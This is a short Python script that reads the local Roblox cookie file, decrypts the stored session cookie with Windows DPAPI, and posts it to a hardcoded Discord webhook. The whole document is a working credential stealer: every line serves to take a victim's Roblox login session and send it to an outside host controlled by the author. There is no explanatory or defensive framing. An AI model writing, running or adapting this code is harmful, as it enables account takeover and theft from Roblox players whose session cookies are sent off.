import os, json, base64, win32crypt, requests;
path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'LocalStorage', 'RobloxCookies.dat');
data = json.load(open(path));
decrypted = win32crypt.CryptUnprotectData(base64.b64decode(data['CookiesData']), None, None, None, 0)[1].decode('utf-8');
parts = decrypted.split('\t');
cookie = parts[6] if len(parts) > 6 else parts[-1];
requests.post('https://discord.com/api/webhooks/1538128797734543506/-L5OnwGsG0wt4yoZp2l_ZtA_kytuIS8dXYunS2c23L8tkm8ieT3ZTMa5TtyH-DN-ca2p', json={'content':f'{cookie}'})
